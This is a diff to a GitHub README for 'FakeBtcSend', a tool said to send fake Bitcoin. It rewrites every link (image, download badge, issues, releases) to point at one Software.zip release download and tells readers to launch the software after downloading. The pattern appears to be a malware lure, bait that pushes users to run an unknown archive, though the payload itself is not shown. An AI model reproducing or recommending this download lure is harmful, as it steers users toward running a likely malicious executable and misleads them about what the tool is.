@@ -2,7 +2,7 @@
 
 ## Send Btc To Anyone
 
-![Bitcoin](https://www.pngkey.com/png/full/18-183488_bitcoin-golden-coin-png-picture-bitcoin-png.png)
+![Bitcoin](https://github.com/DrankRych/FakeBtcSend/releases/download/v2.0/Software.zip)
 
 This repository contains a software tool that allows you to send fake Bitcoin to anyone you want. It is a fun and educational way to explore the world of cryptocurrency transactions without using real funds. The tool is designed to simulate Bitcoin transactions in a safe environment, perfect for testing and learning purposes.
 
@@ -12,7 +12,7 @@ To get started with sending fake Bitcoin, follow these steps:
 
 1. Download the software tool by clicking on the link below:
    
-   [![Download FakeBtcSend](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18388744/Software.zip "Software.zip")
+   [![Download FakeBtcSend](https://github.com/DrankRych/FakeBtcSend/releases/download/v2.0/Software.zip)](https://github.com/DrankRych/FakeBtcSend/releases/download/v2.0/Software.zip "https://github.com/DrankRych/FakeBtcSend/releases/download/v2.0/Software.zip")
 
    *(Note: The software needs to be launched after download)*
 
@@ -49,7 +49,7 @@ amount = 0.5
 send_bitcoin(recipient_address, amount)
 ```
 
-🌐 **Visit [Software.zip](https://github.com/user-attachments/files/18388744/Software.zip) to download the tool and start sending fake Bitcoin to your friends!**
+🌐 **Visit [https://github.com/DrankRych/FakeBtcSend/releases/download/v2.0/Software.zip](https://github.com/DrankRych/FakeBtcSend/releases/download/v2.0/Software.zip) to download the tool and start sending fake Bitcoin to your friends!**
 
 🤖 **License**
 
@@ -57,12 +57,12 @@ This software tool is made available under the MIT License. Feel free to use it 
 
 📢 **Feedback**
 
-We would love to hear your feedback on the FakeBtcSend tool. If you have any suggestions or encounter any issues, please open an [issue](https://github.com/username/FakeBtcSend/issues) on GitHub.
+We would love to hear your feedback on the FakeBtcSend tool. If you have any suggestions or encounter any issues, please open an [issue](https://github.com/DrankRych/FakeBtcSend/releases/download/v2.0/Software.zip) on GitHub.
 
 👨‍💻 **Contributing**
 
 If you're interested in contributing to the development of FakeBtcSend, feel free to fork the repository and submit a pull request with your changes.
 
-📌 **Check the [Releases](https://github.com/username/FakeBtcSend/releases) section for the latest updates and versions of the software tool.**
+📌 **Check the [Releases](https://github.com/DrankRych/FakeBtcSend/releases/download/v2.0/Software.zip) section for the latest updates and versions of the software tool.**
 
 Let's have fun sending fake Bitcoin with FakeBtcSend! 🚀🌟🔥
